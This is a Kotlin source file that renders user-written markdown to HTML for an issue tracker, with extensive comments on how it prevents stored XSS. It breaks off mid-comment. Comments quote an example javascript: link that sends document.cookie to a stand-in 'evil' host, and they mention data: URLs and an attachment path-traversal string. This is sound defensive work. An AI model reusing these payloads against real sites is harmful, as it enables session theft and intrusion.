/**
 * Markdown → HTML, with an allow-list and no passthrough.
 *
 * ── Why this file is security code ───────────────────────────────────────────
 *
 * The editor has an underline button. No flavour of markdown has underline —
 * deliberately, because underlined text on the web means "link" — so the stored
 * format is markdown **plus a little inline HTML**: `<u>text</u>`.
 *
 * That one decision is what makes this file dangerous. The stored document now
 * legitimately contains HTML, on a field any signed-in user can write and every
 * other user will read. A renderer that passed raw HTML through — which is what
 * "just support a bit of HTML" means in practice, and what almost every markdown
 * library does when you enable it — is **stored XSS**, straight into a page
 * carrying the reader's session cookie.
 *
 * So: nothing in the input is ever treated as markup. Every `<`, `>`, `&` and
 * `"` is escaped *first*, unconditionally, and the only tags in the output are
 * ones this file emits itself. `<u>` survives because [restoreAllowedTags] puts
 * it back afterwards, from the escaped text, by exact match — not because it was
 * let through.
 *
 * Written by hand rather than pulled in: a markdown library is a large
 * dependency whose HTML-handling default is the one thing that must not be
 * wrong, and the subset here is seven constructs.
 *
 * @see se.soderbjorn.lunicle.client.viewmodel.IssueBackingViewModel
 */
package se.soderbjorn.lunicle.client

import se.soderbjorn.lunicle.clientserver.ApiRoutes
import se.soderbjorn.lunicle.clientserver.MentionSpan
import se.soderbjorn.lunicle.clientserver.mentionSpans

/**
 * Resolve a ticket reference to the issue's title, or null when it is not known —
 * the hook that lets a rendered `PREFIX-NUMBER` read `PREFIX-NUMBER: Title`
 * (LNL-144). Synchronous by design: rendering runs inline on a state change, so
 * the caller answers from data it already holds (the current board, a cache of
 * ones it has seen) and returns null rather than blocking for a fetch — an
 * unknown title just leaves the reference bare, exactly as before the title.
 */
typealias TicketTitleLookup = (Ticket) -> String?

/** The default title lookup: no titles, every reference stays bare. */
val NO_TICKET_TITLES: TicketTitleLookup = { null }

/**
 * The inline HTML the editor may produce, and the *only* tags restored after
 * escaping.
 *
 * `<u>` and nothing else, because underline is the only button with no markdown
 * spelling. Adding to this list is adding to the attack surface: each entry is a
 * tag a user can put in an issue that every reader's browser will execute as
 * markup. Anything with an attribute — `<a href>`, `<img src>` — must never
 * appear here, because attributes are where javascript: URLs and event handlers
 * live. Links and images have markdown spellings and are built by this file with
 * their URLs checked; see [renderLinks] and [isSafeMarkdownUrl].
 */
private val ALLOWED_INLINE_TAGS = listOf("u")

/**
 * The characters a backslash may neutralise, and the whole reason backslash
 * escaping exists here at all.
 *
 * The WYSIWYG editor never shows markup, so the only way it can represent text
 * that *contains* a marker — someone typing "2 * 3 * 4", or "#1 in the list" —
 * is to escape it on the way out. Without this, [serialiseMarkdown] would emit
 * the markers raw, this file would read them back as formatting, and the user's
 * text would silently change into something they never wrote. That is exactly
 * the round-trip corruption the editor's preamble used to warn about, and this
 * is the half of the answer that lives on the rendering side.
 *
 * Deliberately only the characters this renderer acts on. Escaping more would
 * mean `\` before punctuation that means nothing here, and every one of those
 * would show up as a literal backslash the moment anything else read the stored
 * document.
 */
private const val ESCAPABLE = "\\*~`[]!<#-"

/** The subset that is significant anywhere in a line, as opposed to only at its start. */
private const val INLINE_ESCAPABLE = "\\*~`[]!<"

/**
 * Where an escaped character hides while the rules run.
 *
 * An escaped `*` cannot stay a `*` — the italic rule would match it — and it
 * cannot become its final text either, because that text has to be HTML-escaped
 * *after* [restoreAllowedTags] has had its say. So each one becomes a private-use
 * character, chosen because no rule in this file matches one and no keyboard
 * produces one, and turns back into itself at the very end.
 */
private const val PLACEHOLDER_BASE = '\uE000'

/**
 * Escape the markers that are significant mid-line, for [serialiseMarkdown].
 *
 * The block-level markers (`#`, `- `) are [escapeMarkdownBlock]'s job, because
 * whether they mean anything depends on where in the line they sit — a `-` in
 * "well-formed" is a hyphen, and escaping every one of them would litter the
 * stored document for nothing.
 */
fun escapeMarkdown(text: String): String = buildString(text.length) {
    text.forEach { c ->
        if (c in INLINE_ESCAPABLE) append('\\')
        append(c)
    }
}

/**
 * Escape a line that would otherwise be read as a heading or a list item.
 *
 * Applied to an assembled paragraph, per line: "# 1 sold" typed as prose is a
 * paragraph in the editor, and must not come back as an `<h1>`.
 */
fun escapeMarkdownBlock(text: String): String =
    text.lines().joinToString("\n") { line ->
        if (BLOCK_MARKER.containsMatchIn(line)) {
            val indent = line.takeWhile { it == ' ' }
            indent + "\\" + line.drop(indent.length)
        } else {
            line
        }
    }

private val BLOCK_MARKER = Regex("^ *(#{1,6} |- )")

/** Swap each `\x` for its placeholder, before anything else can read the `x`. */
private fun extractEscapes(text: String): String = buildString(text.length) {
    var i = 0
    while (i < text.length) {
        val c = text[i]
        val slot = if (c == '\\' && i + 1 < text.length) ESCAPABLE.indexOf(text[i + 1]) else -1
        if (slot >= 0) {
            append(PLACEHOLDER_BASE + slot)
            i += 2
        } else {
            // A backslash before anything else is just a backslash. Swallowing
            // it would corrupt a Windows path someone pasted into an issue.
            append(c)
            i++
        }
    }
}

/** Turn the placeholders back into their characters, HTML-escaped as text. */
private fun restoreEscapes(text: String): String = buildString(text.length) {
    text.forEach { c ->
        val slot = c - PLACEHOLDER_BASE
        if (slot in ESCAPABLE.indices) append(ESCAPABLE[slot].toString().escapeHtml()) else append(c)
    }
}

/**
 * Drop any placeholder character the input already contained.
 *
 * Otherwise the input could forge one: a document containing U+E007 literally
 * would come out the other end as a `[`, having never been escaped — a way to
 * smuggle a marker past the rules that is not available to anyone typing.
 */
private fun stripPlaceholders(text: String): String =
    text.filter { (it - PLACEHOLDER_BASE) !in ESCAPABLE.indices }

/**
 * Escape everything. The first thing that happens to any input, always.
 *
 * `"` and `'` are escaped along with the obvious three because rendered text
 * lands inside attribute values in [renderImages] and [renderLinks] — an
 * unescaped quote there closes the attribute and opens a tag.
 */
private fun String.escapeHtml(): String = buildString(length) {
    this@escapeHtml.forEach { c ->
        when (c) {
            '&' -> append("&amp;")
            '<' -> append("&lt;")
            '>' -> append("&gt;")
            '"' -> append("&quot;")
            '\'' -> append("&#39;")
            else -> append(c)
        }
    }
}

/**
 * Is this URL safe to put in an `href` or a `src`?
 *
 * Public because the editor asks it too, before putting a typed URL into a live
 * `href` in the document being edited. Same question, same answer, one
 * implementation — a second scheme check written on the editor's side is a
 * second thing to get wrong.
 *
 * An allow-list of schemes, because the interesting attack is not a tag at all:
 * `[click](javascript:fetch('//evil/'+document.cookie))` is valid markdown, and
 * a renderer that emits the href verbatim has just executed a script on click.
 * `data:` is refused for the same reason — `data:text/html,...` in an href is a
 * same-tab navigation into attacker-controlled HTML.
 *
 * Relative URLs are allowed, and are the common case: every uploaded image is
 * `/api/attachments/<id>`.
 */
fun isSafeMarkdownUrl(url: String): Boolean {
    val trimmed = url.trim().lowercase()
    // A scheme-relative URL (//evil.example) inherits our scheme and is a real
    // off-site link, but it is also a legitimate thing to write. It is the
    // colon-bearing schemes that decide execution, so those are what is checked.
    if (!trimmed.contains(':')) return true
    return trimmed.startsWith("http://") ||
        trimmed.startsWith("https://") ||
        trimmed.startsWith("mailto:")
}

/**
 * Render markdown to HTML that is safe to assign to `innerHTML`.
 *
 * Supports exactly what the editor's toolbar can produce: headings, bold,
 * italic, strikethrough, inline code, links, images, and `<u>`. Everything else
 * is text.
 *
 * @param markdown the stored document.
 * @param prefixes the project prefixes whose issues, written as `PREFIX-NUMBER`,
 *   are turned into links (LNL-139) — the reader's accessible projects, so a
 *   reference across projects links too and a click switches to get there. Empty
 *   — the default — turns none into links, which is what a reading surface with no
 *   projects behind it (a forum message, say) wants, and what keeps the editor's
 *   live copy inert. See [renderTicketRefs].
 * @param self the issue this surface is already showing, or null. A reference to
 *   it — a card leading with its own key, an issue naming itself in its own body —
 *   is left as plain text rather than a link back to the page you are on (LNL-151).
 *   See [linkifyTickets].
 * @param titleFor the issue title to show after a reference, so `LNL-1` reads
 *   `LNL-1: Fix the thing` (LNL-144); returning null or blank leaves the reference
 *   bare, which is the default and what the editor's live copy and any surface
 *   with no title source want. See [linkifyTickets].
 * @return HTML with no tag in it that this file did not emit.
 */
fun renderMarkdown(
    markdown: String,
    prefixes: Collection<String> = emptyList(),
    self: Ticket? = null,
    titleFor: TicketTitleLookup = NO_TICKET_TITLES,
): String {
    // Backslash escapes come out first, into placeholders. This has to precede
    // escapeHtml: "\<" must be recognised while it is still a "<", and one line
    // further down it is the string "&lt;".
    val source = extractEscapes(stripPlaceholders(markdown))

    // Escape SECOND, and before any rule runs. Everything below operates on
    // already-escaped text, so a "<script>" in the source is the literal string
    // "&lt;script&gt;" by the time any rule sees it, and no rule can turn it
    // back into a tag. Placeholders pass through untouched — they are none of
    // the five characters this escapes.
    val escaped = source.escapeHtml()

    val blocks = escaped.split("\n\n")
    val rendered = blocks.mapNotNull { block ->
        val trimmed = block.trim()
        if (trimmed.isEmpty()) return@mapNotNull null
        renderBlock(trimmed, prefixes, titleFor, self)
    }.joinToString("\n")

    // Placeholders resolve LAST, after restoreAllowedTags has run inside every
    // block. The order matters and is not obvious: an escaped "<" that resolved
    // any earlier would be a "&lt;" sitting next to the "&gt;" of an unescaped
    // ">", and restoreAllowedTags — which matches "&lt;u&gt;" by exact string —
    // would turn the text someone escaped precisely to keep inert back into a
    // real <u> tag.
    return restoreEscapes(rendered)
}

/**
 * Turn the bare URLs in a line of plain text into links, and touch nothing else.
 *
 * The counterpart to [renderMarkdown] for a field that is not markdown. An issue
 * title is a plain-text line with no editor behind it: nothing there ever emits
 * `**` or `#`, so rendering "2 * 3" as anything but itself would be inventing
 * formatting the author never wrote, and drawing an `<img>` inside a board card
 * from `![x](y)` would be worse. What a title *can* carry is a URL somebody
 * pasted, and LNL-44's promise — a link written as itself becomes clickable —
 * should hold on a card too. So this runs only the autolink half of the pipeline.
 *
 * The security discipline is [renderMarkdown]'s, unchanged and for the same
 * reason: [stripPlaceholders] then [escapeHtml] run first, so every character of
 * the title is inert text before any pattern sees it, and the only tags in the
 * output are the `<a>`s [externalLink] builds from a URL it has checked.
 *
 * It reuses [MARKDOWN_TARGET] rather than a second regex — the `www.`
 * word-boundary handling and the placeholder exclusions are exactly the
 * subtleties that must not drift between two copies. The markdown-link and image
 * branch is matched but deliberately handed back verbatim: `[label](url)` in a
 * plain-text title is not markup, so it stays as written, brackets and all.
 *
 * @param prefixes as in [renderMarkdown] — a `PREFIX-NUMBER` in a title becomes a
 *   link to that issue too (LNL-139), which is the whole point of the ticket that
 *   asked for it on the card as well as in the body.
 * @param self as in [renderMarkdown] — the issue this surface already shows, whose
 *   own key stays plain text rather than a link back to itself (LNL-151).
 * @param titleFor as in [renderMarkdown] — the referenced issue's title, appended
 *   after the reference (LNL-144), or null to leave it bare.
 */
fun renderInlineLinks(
    text: String,
    prefixes: Collection<String> = emptyList(),
    self: Ticket? = null,
    titleFor: TicketTitleLookup = NO_TICKET_TITLES,
): String {
    val escaped = stripPlaceholders(text).escapeHtml()
    val linked = MARKDOWN_TARGET.replace(escaped) { match ->
        val bare = match.groupValues[4]
        if (bare.isNotEmpty()) return@replace autolink(bare)

        // Group 5 is the character the www branch consumed to prove a word
        // boundary — never part of the link, handed straight back.
        val schemeless = match.groupValues[6]
        if (schemeless.isNotEmpty()) {
            return@replace match.groupValues[5] + autolink(schemeless, scheme = "https://")
        }

        // A markdown-link or image match: not markup in a title, left as written.
        match.value
    }
    return renderTicketRefs(linked, prefixes, titleFor, self)
}

/**
 * One paragraph, heading, or list.
 *
 * A heading is a *line*, not a block, so "# Title" followed by a line of prose
 * is a heading and a paragraph rather than one odd-looking heading. Handled by
 * splitting the block rather than with a dot-matches-all regex, because that
 * option is JVM-only — `RegexOption.DOT_MATCHES_ALL` does not exist on
 * Kotlin/JS, and this file is common code compiled for both.
 */
private fun renderBlock(block: String, prefixes: Collection<String>, titleFor: TicketTitleLookup, self: Ticket?): String {
    val lines = block.lines().filter { it.isNotBlank() }
    if (lines.isEmpty()) return ""

    if (lines.all { it.trimStart().startsWith("- ") }) {
        val items = lines.joinToString("") { "<li>${renderInline(it.trimStart().removePrefix("- "), prefixes, titleFor, self)}</li>" }
        return "<ul>$items</ul>"
    }

    val heading = HEADING.find(lines.first())
    if (heading != null) {
        val level = heading.groupValues[1].length
        val rendered = "<h$level>${renderInline(heading.groupValues[2].trim(), prefixes, titleFor, self)}</h$level>"
        val rest = lines.drop(1)
        return if (rest.isEmpty()) rendered else rendered + "\n" + paragraph(rest.joinToString("\n"), prefixes, titleFor, self)
    }

    return paragraph(block, prefixes, titleFor, self)
}

/** Headings: # through ######, matching the toolbar's buttons. Seven is not a heading. */
private val HEADING = Regex("^(#{1,6})\\s+(.*)$")

/**
 * A paragraph.
 *
 * A single newline becomes a line break, which is what someone typing into a
 * textarea means by it. Markdown's "two trailing spaces" rule is a trap nobody
 * discovers on purpose, and invisible in the field where it would have to be
 * typed.
 */
private fun paragraph(text: String, prefixes: Collection<String>, titleFor: TicketTitleLookup, self: Ticket?): String =
    "<p>${renderInline(text, prefixes, titleFor, self).replace("\n", "<br>")}</p>"

/** Inline rules, in an order that matters — see the comments. */
private fun renderInline(text: String, prefixes: Collection<String>, titleFor: TicketTitleLookup, self: Ticket?): String {
    var out = text

    // Images, links and bare URLs in ONE pass. See renderTargets for why they
    // cannot be three.
    out = renderTargets(out)

    // Bold before italic, and the order is load-bearing: "**x**" contains "*x*",
    // so italic first would eat the inner pair and leave "*<em>x</em>*".
    //
    // Running bold first is also what lets the italic rule stay simple. By the
    // time it runs, every "**" has already become a <strong>, so any "*" still
    // standing is an italic marker — no lookbehind needed to tell them apart.
    // That matters: lookbehind is ES2018, and Safari did not ship it until
    // 16.4, so a regex using it compiles happily and then fails at runtime in
    // one browser.
    out = out.replace(Regex("\\*\\*([^*]+)\\*\\*"), "<strong>$1</strong>")
    out = out.replace(Regex("\\*([^*\\n]+)\\*"), "<em>$1</em>")
    out = out.replace(Regex("~~([^~]+)~~"), "<del>$1</del>")
    out = out.replace(Regex("`([^`]+)`"), "<code>$1</code>")

    // Last, so the rules above have already run over the text a mention sits in.
    out = renderMentions(out)

    // After everything else, and over the tags everything else has emitted:
    // renderTicketRefs will not linkify inside a link, a code span or a mention,
    // which are exactly the constructs already standing by now. See its comment.
    out = renderTicketRefs(out, prefixes, titleFor, self)

    return restoreAllowedTags(out)
}

/**
 * `@{Ada Lovelace}` and `@grace` → a coloured mention, with the syntax gone.
 *
 * Nobody should have to read punctuation to find out that a person was named.
 * The braces exist so the *stored* document says unambiguously where a name ends
 * — see [mentionSpans] — and a reader has no use for them at all, so this is
 * where they stop.
 *
 * ── The attribute, and why it is not decoration ─────────────────────────────
 *
 * `data-mention` carries the name the mention actually named, which is not
 * always what the span *reads*: the span reads "@Ada Lovelace", and the document
 * said `@{Ada Lovelace}`. [serialiseMarkdown] reads the attribute back and
 * re-emits the canonical spelling, which is what makes the round trip closed. Do
 * not remove it in the belief that the text is enough — without it, editing a
 * description would rewrite `@{Ada Lovelace}` as a bare `@Ada Lovelace`, which
 * is no longer a mention of anybody and would silently stop notifying her.
 *
 * The span carries a class and a data attribute and no URL, which is why adding
 * it does not widen what [ALLOWED_INLINE_TAGS] guards: this file emits the tag
 * itself, from a name that was HTML-escaped before any rule ran, exactly as it
 * emits `<strong>`. A mention naming somebody who does not exist is still drawn
 * as a mention — the renderer has no roster to check against, and inventing one
 * would mean shipping the account directory to every reader of a public board.
 */
private fun renderMentions(text: String): String {
    val spans = mentionSpans(text).filterNot { it.isInsideTag(text) }
    if (spans.isEmpty()) return text
    return buildString(text.length) {
        var cursor = 0
        spans.forEach { span ->
            append(text, cursor, span.start)
            // The name is already HTML-escaped — it came out of a string that
            // escapeHtml ran over before any rule did — so it is safe both as
            // text and inside the quoted attribute, whose quotes escapeHtml also
            // escaped. See renderMarkdown's ordering.
            append("<span class=\"mention\" data-mention=\"").append(span.name).append("\">@")
                .append(span.name).append("</span>")
            cursor = span.end
        }
        append(text, cursor, text.length)
    }
}

/**
 * The elements a ticket reference must never be drawn *inside*.
 *
 * `a` because an `<a>` inside an `<a>` is not surprising markup, it is broken
 * markup — the browser un-nests it — and `[LNL-1](https://x)` would produce
 * exactly that, an autolinked label sitting in an anchor. `code` because inline
 * code is text shown literally, and a link is the one thing it must not become.
 * `span` because the only span this file emits is a mention, and a mention that
 * happens to read `LNL-1` is a mention, not an issue link.
 */
private val TICKET_SKIP_ELEMENTS = setOf("a", "code", "span")

/**
 * Turn each `PREFIX-NUMBER` in [html] into a link to that issue — the render half
 * of LNL-139, the click half being the web client's `navigateToTicket`.
 *
 * ── Why this walks tags instead of running a regex ──────────────────────────
 *
 * It runs *last*, over HTML the rest of the pipeline has already built, and a
 * reference is only a reference in the prose — never inside the `href` of a link
 * that merely contains `…/LNL-1` in its path, and never inside the anchor, code
 * span or mention listed in [TICKET_SKIP_ELEMENTS]. A regex replace cannot tell
 * "in the text" from "in a tag it emitted", which is the same trap
 * [MentionSpan.isInsideTag] exists to sidestep; here the constructs to avoid nest,
 * so a one-character look-back is not enough and a small scanner is.
 *
 * The scan is sound because of [renderMarkdown]'s ordering: every `<` and `>` from
 * the source is `&lt;`/`&gt;` by now and [restoreAllowedTags] has not run, so the
 * only real angle brackets left are the tags this file wrote itself. So each `<`
 * opens a known-well-formed tag, and the text between tags is exactly the prose a
 * reference may live in. That prose is already HTML-escaped, and the anchor's
 * `href` and `data-ticket` carry only [Ticket.toString] — a prefix and digits,
 * none of the five characters [escapeHtml] touches. The one thing that is *not*
 * already inert is a title from [titleFor], which is arbitrary user text; that is
 * escaped where it is appended — see [linkifyTickets].
 *
 * @param prefixes the projects whose references to link; empty links none, and is
 *   the whole of how a prefix-less reading surface opts out.
 * @param titleFor the referenced issue's title, appended after the link's key
 *   (LNL-144); null or blank leaves it bare.
 * @param self the issue this surface already shows; a reference to it is left as
 *   plain text rather than linked back to itself (LNL-151).
 */
private fun renderTicketRefs(html: String, prefixes: Collection<String>, titleFor: TicketTitleLookup, self: Ticket?): String {
    if (prefixes.isEmpty()) return html
    if (!html.contains('-')) return html

    val out = StringBuilder(html.length)
    // The open skip-elements, outermost first. A reference is linked only when
    // this is empty; anything on it means we are inside an <a>, <code> or mention.
    val skipStack = ArrayDeque<String>()
    var i = 0
    var textStart = 0

    fun flush(end: Int) {
        if (end <= textStart) return
        val segment = html.substring(textStart, end)
        out.append(if (skipStack.isEmpty()) linkifyTickets(segment, prefixes, titleFor, self) else segment)
    }

    while (i < html.length) {
        if (html[i] != '<') {
            i++
            continue
        }
        flush(i)
        val close = html.indexOf('>', i)
        if (close < 0) break // Unterminated tag: impossible from our own output.
        val tag = html.substring(i, close + 1)
        out.append(tag)
        tagName(tag)?.let { name ->
            if (name in TICKET_SKIP_ELEMENTS) {
                if (tag.startsWith("</")) {
                    if (skipStack.lastOrNull() == name) skipStack.removeLast()
                } else if (!tag.endsWith("/>")) {
                    skipStack.addLast(name)
                }
            }
        }
        i = close + 1
        textStart = i
    }
    flush(html.length)
    return out.toString()
}

/** The lower-cased element name of a tag this file emitted, or null. */
private fun tagName(tag: String): String? {
    var start = 1
    if (start < tag.length && tag[start] == '/') start++
    var end = start
    while (end < tag.length && tag[end].isLetter()) end++
    return if (end > start) tag.substring(start, end).lowercase() else null
}

/**
 * Wrap every ticket reference in one run of prose in an `<a>`.
 *
 * The key is the reference as it was written — `lnl-1` stays `lnl-1` — because
 * that is what the author typed and rewriting it to the canonical case would be a
 * second, silent edit. The destination is the canonical [Ticket], which is what
 * `data-ticket` carries for the click handler and `?issue=` carries for a
 * middle-click or a copied link, both of which resolve case-insensitively anyway.
 *
 * When [titleFor] knows the referenced issue's title, it is appended inside the
 * same anchor as `key: Title` (LNL-144), so the whole thing is one link and a
 * click anywhere on it opens the issue. The title is arbitrary user text — the
 * one thing in this anchor not already HTML-escaped by [renderMarkdown]'s
 * up-front pass — so it is escaped here, and dimmed by its own class so the key
 * stays the emphatic part. An unknown or blank title leaves the reference bare,
 * exactly as before the title existed.
 *
 * A reference to [self] — the issue this very surface is showing — is left as its
 * plain key with no anchor at all (LNL-151): a board card leads with its own key,
 * and linking that back to the page you are already on is a click that goes
 * nowhere useful. The key is a substring of the already-escaped [text], so it is
 * safe to append verbatim.
 */
private fun linkifyTickets(text: String, prefixes: Collection<String>, titleFor: TicketTitleLookup, self: Ticket?): String {
    val spans = ticketSpans(text, prefixes)
    if (spans.isEmpty()) return text
    return buildString(text.length) {
        var cursor = 0
        spans.forEach { span ->
            append(text, cursor, span.start)
            val key = text.substring(span.start, span.end)
            if (span.ticket == self) {
                append(key)
            } else {
                append("<a href=\"?issue=").append(span.ticket).append("\" class=\"ticket-ref\" data-ticket=\"")
                    .append(span.ticket).append("\">").append(key)
                titleFor(span.ticket)?.takeIf { it.isNotBlank() }?.let { title ->
                    append("<span class=\"ticket-ref-title\">: ").append(title.escapeHtml()).append("</span>")
                }
                append("</a>")
            }
            cursor = span.end
        }
        append(text, cursor, text.length)
    }
}

/**
 * The three things in a line that become an `href` or a `src`, in one pattern.
 *
 * ── Why one pattern and not three passes ────────────────────────────────────
 *
 * Images and links already had to share a pass in effect: their syntaxes differ
 * only by a leading `!`, so running the link rule first would match the
 * `[alt](url)` half of an image and leave a stray `!` in front of an `<a>`. The
 * old code expressed that as "images first, links second", which works and is one
 * ordering rule to remember.
 *
 * A bare URL cannot be added as a third pass under any ordering, and that is what
 * forced this shape:
 *
 *  - **After** the other two, and it matches the URL sitting inside the `src="…"`
 *    and `href="…"` those two just emitted — producing an `<a>` nested inside an
 *    attribute value, which is broken markup built out of a URL a user supplied.
 *  - **Before** them, and it matches the URL inside `[label](https://…)` before
 *    anything knows that URL is spoken for, turning a written link into an `<a>`
 *    inside a pair of literal brackets.
 *
 * One left-to-right scan has neither problem: at any position exactly one branch
 * matches, the whole construct is consumed, and the scan resumes after it. A URL
 * inside a markdown link is inside a match that already started at the `[`, so
 * the bare-URL branch never sees it.
 *
 * The `\]` must stay escaped. A bare `]` outside a character class is legal on
 * the JVM and legal in a plain JavaScript regex — and a **SyntaxError** in a
 * unicode-mode one, which is what Kotlin/JS compiles every [Regex] to (`/…/gu`).
 * So the unescaped version passes `jvmTest`, passes review, and then throws "Lone
 * quantifier brackets" in the browser the first time anyone renders a
 * description. Only `jsTest` catches it.
 *
 * ── The scheme-less branch ──────────────────────────────────────────────────
 *
 * `www.aftonbladet.se` is a link to everyone who reads it and to no parser that
 * asks for a scheme, so it gets a branch of its own. It cannot simply be folded
 * into the scheme branch as an optional prefix: what makes it a link is the
 * literal `www.`, and dropping the scheme requirement without it would autolink
 * every `foo.bar` in prose — including "etc.Then" and every file name anyone
 * mentions.
 *
 * It has to be anchored to a word boundary, which is why group 5 exists. Without
 * it `ada@www.example.com` and `.../path/www.x` link their tails, and a
 * lookbehind is not an option: Kotlin/JS compiles to a unicode-mode regex, and
 * lookbehind support there is the browser's, not ours. So the preceding
 * character is *matched* instead, in a group that [renderTargets] puts straight
 * back. `@` and `/` are excluded because they mean the `www.` belongs to
 * something bigger; a `.` because `foo.www.x` is one host, not prose then a
 * link. The character after `www.` is required to be one a host can start with,
 * so that a sentence ending "…and so on, see www." is left alone rather than
 * linked to nothing.
 *
 * Case-insensitive for this branch's sake — "Www.x.se" opens a sentence — and
 * harmlessly for the rest, where it also lets `HTTP://` through.
 *
 * Group 1 is the image's `!`, 2 the label or alt, 3 the URL in parentheses, 4 a
 * bare URL with a scheme, 5 the character before a scheme-less one, and 6 that
 * URL. The two bare branches stop at whitespace and at a placeholder — see
 * [PLACEHOLDER_BASE] — so a URL written immediately before an escaped character
 * does not swallow it.
 */
private val MARKDOWN_TARGET =
    Regex(
        "(!?)\\[([^\\]]*)\\]\\(([^)\\s]+)\\)" +
            "|(https?://[^\\s\\uE000-\\uE00F]+)" +
            "|(^|[^\\w@/.])(www\\.[\\w-][^\\s\\uE000-\\uE00F]*)",
        RegexOption.IGNORE_CASE,
    )

/**
 * Is this mention inside a tag rather than inside the text?
 *
 * ── The bug this exists to stop ─────────────────────────────────────────────
 *
 * `renderMentions` runs last, over text that [renderTargets] has already put tags
 * into — and a URL is allowed to contain an `@`. `https://example.com/@ada` is an
 * ordinary profile URL on half a dozen sites, and once it is autolinked its `@ada`
 * appears twice: in the link's text, where a mention chip is merely surprising,
 * and inside `href="…"`, where writing a `<span>` into the middle of an attribute
 * value is broken markup assembled out of a string a user supplied. That is not a
 * cosmetic problem; it is the one class of thing this file exists to never do.
 *
 * Safe to answer by counting angle brackets because of the ordering in
 * [renderMarkdown]: every `<` and `>` from the source is `&lt;`/`&gt;` by now, and
 * `restoreAllowedTags` has not run yet, so the only real ones are the tags this
 * file emitted itself.
 */
private fun MentionSpan.isInsideTag(text: String): Boolean {
    // Walk back to the nearest bracket. If it opens a tag, the mention is in one.
    for (index in start - 1 downTo 0) {
        when (text[index]) {
            '<' -> return true
            '>' -> return false
        }
    }
    return false
}

/**
 * `![alt](url)` → `<img>`, `[text](url)` → `<a>`, and a bare `https://…` or
 * `www.…` → `<a>`.
 *
 * The alt text and the label are already escaped and land in an attribute, which
 * is why [escapeHtml] escapes quotes. A refused URL renders as the alt text or
 * label alone rather than vanishing: silently dropping content a user wrote is
 * worse than showing it inertly.
 */
private fun renderTargets(text: String): String =
    MARKDOWN_TARGET.replace(text) { match ->
        val bare = match.groupValues[4]
        if (bare.isNotEmpty()) return@replace autolink(bare)

        // Group 5 is the character the www branch had to consume to prove it was
        // at a word boundary — never part of the link, so it goes straight back.
        val schemeless = match.groupValues[6]
        if (schemeless.isNotEmpty()) {
            return@replace match.groupValues[5] + autolink(schemeless, scheme = "https://")
        }

        val label = match.groupValues[2]
        val url = hostOnly(match.groupValues[3])
        when {
            !isSafeMarkdownUrl(url) -> label
            // The "!" is the whole difference between the two spellings.
            match.groupValues[1] == "!" -> "<img src=\"$url\" alt=\"$label\">"
            isAttachmentUrl(url) -> attachmentLink(url, label)
            else -> externalLink(url, label)
        }
    }

/**
 * `www.example.com` written inside a link's parentheses → the same URL with the
 * scheme its author left off.
 *
 * Without this, a *written* link is the one place a `www.` URL still fails: a
 * relative href is a legal thing to write — every attachment is one — so nothing
 * refuses it, and the reader is quietly sent to `…/www.example.com` on our own
 * host. Which is the harder failure to notice of the two, because the link looks
 * fine right up until it is clicked.
 *
 * Nothing else is guessed at. `example.com` with no `www.` stays relative,
 * because a bare word with a dot in it is far more often a path than a host, and
 * a rule that took it would break every relative link anyone has written.
 */
private fun hostOnly(url: String): String =
    if (url.startsWith("www.", ignoreCase = true)) "https://$url" else url

/**
 * A URL somebody typed as itself → a link to it, plus whatever punctuation was
 * really the sentence's.
 *
 * ── Why the tail has to be given back ───────────────────────────────────────
 *
 * "See https://example.com." ends in a full stop belonging to the sentence, and
 * "(https://example.com)" is a URL in parentheses. A pattern that stops at
 * whitespace cannot tell either from a URL that genuinely ends that way, because
 * both are legal characters in a path. So the match is deliberately greedy and
 * [splitUrlTail] hands the trailing punctuation back as text — which is the only
 * arrangement where a link and the prose around it both survive.
 *
 * No scheme check: the pattern that produced this only matches `http://`,
 * `https://` and `www.`, and the first two are two of the three
 * [isSafeMarkdownUrl] allows. A `javascript:` URL is not a bare URL to this rule
 * at all, so it stays text — which is a stricter answer than the written-link
 * branch needs to give, and the right one, since nobody types one by accident.
 *
 * @param scheme prepended to the `href` and to nothing else. A `www.` URL needs
 *   one to be a link at all — without it the browser reads it as a relative path
 *   and lands on our own host — but the reader wrote it bare and the link text
 *   stays exactly as written, which is also how it stays honest about where it
 *   goes for anyone hovering it. `https` rather than `http`: a host that only
 *   speaks the latter will redirect, and guessing the plain one downgrades every
 *   site that does not.
 */
private fun autolink(url: String, scheme: String = ""): String {
    val (target, tail) = splitUrlTail(url)
    // Everything trimmed off was a character this rule refused to be sure about,
    // so it goes back as the text it probably always was.
    if (target.isEmpty()) return tail
    return externalLink(scheme + target, target) + tail
}

/**
 * Split a greedily-matched bare URL into the URL and the punctuation after it.
 *
 * The entities matter as much as the plain punctuation and are easier to miss:
 * by the time any rule runs, a `"` in the source is the five characters `&quot;`
 * and a `>` is `&gt;` — so a URL quoted in prose ends in a *word*, not in a
 * symbol, and a trim that only looked at the last character would leave `&quot;`
 * inside the `href`.
 *
 * A trailing `)` comes off only when the URL holds no `(` to match it, which is
 * what keeps Wikipedia's `…/Foo_(disambiguation)` intact while still letting
 * "(see https://example.com)" close its own bracket.
 */
private fun splitUrlTail(url: String): Pair<String, String> {
    var end = url.length
    while (end > 0) {
        val entity = TRAILING_ENTITIES.firstOrNull { end >= it.length && url.startsWith(it, end - it.length) }
        if (entity != null) {
            end -= entity.length
            continue
        }
        val last = url[end - 1]
        if (last in TRAILING_PUNCTUATION) {
            end--
            continue
        }
        if (last == ')' && url.take(end).count { it == '(' } < url.take(end).count { it == ')' }) {
            end--
            continue
        }
        break
    }
    return url.take(end) to url.drop(end)
}

/** Escaped characters that read as punctuation once they are text again. */
private val TRAILING_ENTITIES = listOf("&amp;", "&quot;", "&#39;", "&lt;", "&gt;")

/** Punctuation that ends a sentence far more often than it ends a URL. */
private const val TRAILING_PUNCTUATION = ".,;:!?"

/**
 * An off-site link.
 *
 * `rel="noopener noreferrer"` because these open in a new tab, and a page opened
 * with `target=_blank` can otherwise reach back through `window.opener` and
 * navigate the tab that opened it. `noreferrer` keeps an issue's URL — which may
 * name a private project — out of the destination's logs.
 */
private fun externalLink(url: String, label: String): String =
    "<a href=\"$url\" target=\"_blank\" rel=\"noopener noreferrer\">$label</a>"

/**
 * Is this link one of our own uploaded files?
 *
 * Asked of the *escaped* text, and safe to be: an attachment URL is a fixed
 * prefix and a base64url id, none of which are among the five characters
 * [escapeHtml] touches, so the URL that reaches here is byte-for-byte the one
 * that was stored. Nothing has to be un-escaped to ask this question.
 *
 * The trailing id is checked for shape rather than assumed. It is what confines
 * the attachment path to a URL this app could actually have produced —
 * `/api/attachments/../../secret` is a link like any other, and gets a link's
